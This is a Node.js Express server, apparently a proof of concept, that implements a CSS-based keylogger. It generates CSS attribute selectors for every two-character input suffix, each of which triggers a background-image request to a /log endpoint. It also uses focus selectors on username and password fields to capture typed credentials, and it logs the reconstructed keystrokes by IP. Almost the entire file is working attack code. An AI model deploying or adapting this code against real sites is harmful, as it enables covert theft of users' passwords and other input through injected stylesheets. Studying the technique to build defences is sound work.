const express = require('express');
const path = require('path');
const app = express();
const css = createCSS();
const logs = {};

// Send the index file.
app.get('/', (req, res) => {
  res.sendFile(path.join(`${__dirname}/index.html`));
});

// Send the CSS.
app.get('/bad.css', (req, res) => {
  res.header('Content-Type','text/css');
  res.send(css)
});

// When a character is received (when CSS tries to load an image), log the character.
app.get('/log/:char', (req, res) => {
  const ip = getIP(req);
  let char = req.params.char;
  
  if (!logs[ip])
    logs[ip] = "";
  
  // Two characters will be sent but if we already have the previous characters we don't care about the first one.
  if (logs[ip].charAt(logs[ip].length - 1) === char.charAt(0))
    char = char.charAt(char.length - 1);
  
  logs[ip] += char;
  
  console.log(`[${ip}] ${logs[ip]}`);
  
  res.header('Cache-Control', 'no-cache');
  res.sendStatus(200);
});

// When an input field is focused, reset the text from the IP address and log what field was focused.
app.get('/focus/:field', (req, res) => {
  const field = req.params.field;
  const ip = getIP(req);
  logs[ip] = "";
  
  console.log(`[${ip}] field: ${field}`);

  res.header('Cache-Control', 'no-cache');
  res.sendStatus(200);
});

app.listen(3000, () => console.log('CSS keylogger server listening on port 3000!'));

// Dynamically create the malicious CSS
function createCSS() {
  let css = "";
  const values = [];
  
  // Create an array of all the characters we want to log.
  for (let i = 32; i < 127; i++) {
    let value = String.fromCharCode(i);
    const urlValue = encodeURIComponent(value); // The URL characters must be escaped.
    
    if (value === `"`) value = `\\"`;
    if (value === `\\`) value = `\\\\`;
    
    values.push({css: value, url: urlValue});
	}
	
	// Add a CSS selector for all two-character combinations.
	values.forEach((v1) => {
    values.forEach((v2) => {
     css += `input[value$="${v1.css + v2.css}"] { background-image: url("http://localhost:3000/log/${v1.url + v2.url}") !important }\n`;
    });
  });

  // Add additional selectors to detect focus on the input fields.
  css += `input[name="username"]:focus { background-image: url("http://localhost:3000/focus/username") }\n`;
  css += `input[name="password"]:focus { background-image: url("http://localhost:3000/focus/password") }\n`;

  return css;
}

function getIP(req) {
  return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
}